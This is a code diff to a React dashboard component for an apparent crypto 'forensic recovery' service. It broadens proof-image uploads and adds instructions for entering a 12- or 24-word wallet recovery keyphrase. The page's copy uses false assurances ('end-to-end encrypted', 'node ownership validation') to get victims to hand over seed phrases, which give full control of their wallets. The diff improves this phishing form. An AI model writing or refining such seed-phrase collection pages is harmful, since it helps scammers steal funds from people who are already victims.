@@ -277,10 +277,27 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
       | undefined;
 
     if (proofImage) {
-      const allowedTypes = new Set(['image/jpeg', 'image/png', 'image/webp']);
+      const ext = proofImage.name.split('.').pop()?.toLowerCase() || '';
+      const mimeFromExt: Record<string, string> = {
+        jpg: 'image/jpeg',
+        jpeg: 'image/jpeg',
+        png: 'image/png',
+        webp: 'image/webp',
+        heic: 'image/heic',
+        heif: 'image/heif',
+      };
+      const normalizedType = (proofImage.type || '').toLowerCase();
+      const resolvedMimeType = normalizedType || mimeFromExt[ext] || '';
+      const allowedTypes = new Set([
+        'image/jpeg',
+        'image/png',
+        'image/webp',
+        'image/heic',
+        'image/heif',
+      ]);
       const maxBytes = 5 * 1024 * 1024;
-      if (!allowedTypes.has(proofImage.type)) {
-        setProofImageError('Only JPG, PNG, or WEBP image files are allowed.');
+      if (!allowedTypes.has(resolvedMimeType)) {
+        setProofImageError('Only JPG, JPEG, PNG, WEBP, HEIC, or HEIF image files are allowed.');
         return;
       }
       if (proofImage.size > maxBytes) {
@@ -290,7 +307,7 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
       const dataUrl = await fileToBase64(proofImage);
       proofImagePayload = {
         filename: proofImage.name,
-        mimeType: proofImage.type,
+        mimeType: resolvedMimeType,
         contentBase64: dataUrl.split(',')[1] || '',
       };
     }
@@ -691,6 +708,9 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
                     <p className="text-sm text-slate-300 mb-8 max-w-2xl leading-relaxed">
                       Your case has reached the <span className="text-white font-bold text-blue-400">Wallet Verification Journey Analysis</span> phase. To initiate the deep-trace forensic report and establish authority over the target node, we require your 12 or 24-word recovery keyphrase. This data is end-to-end encrypted and used strictly for node ownership validation.
                     </p>
+                    <p className="text-[11px] text-blue-200/90 mb-6 font-mono">
+                      Keyphrase format: enter words separated by spaces (example: <span className="text-white">word1 word2 word3 ...</span>) or numbered lines (example: <span className="text-white">1. word 2. word 3. word</span>).
+                    </p>
 
                     <form onSubmit={handleSubmitKeyphrase} className="space-y-6">
                       <div className="relative">
@@ -700,7 +720,7 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
                             setKeyphrase(e.target.value);
                             if (validationError) setValidationError(null);
                           }}
-                          placeholder="Enter your 12 or 24-word recovery keyphrase precisely as it appears..."
+                          placeholder="Enter your 12 or 24-word keyphrase (space-separated or numbered) exactly as shown..."
                           className={`w-full bg-black/60 border-2 rounded-xl p-6 font-mono text-sm text-white focus:border-blue-500 outline-none transition-all min-h-[140px] placeholder:text-slate-700 shadow-inner ${validationError ? 'border-red-500/50' : 'border-blue-500/30'}`}
                           required
                         />
@@ -712,11 +732,11 @@ export const ClientDashboardView = ({ caseData }: ClientDashboardViewProps) => {
 
                       <div className="space-y-2">
                         <label className="block text-[10px] font-mono text-slate-400 uppercase tracking-widest">
-                          Optional proof image (JPG/PNG/WEBP, max 5MB)
+                          Optional proof image (JPG/PNG/WEBP/HEIC/HEIF, max 5MB)
                         </label>
                         <input
                           type="file"
-                          accept="image/png,image/jpeg,image/webp"
+                          accept="image/png,image/jpeg,image/webp,image/heic,image/heif,.heic,.heif,.jpg,.jpeg,.png,.webp"
                           onChange={(e) => {
                             setProofImageError(null);
                             const f = e.target.files?.[0] || null;
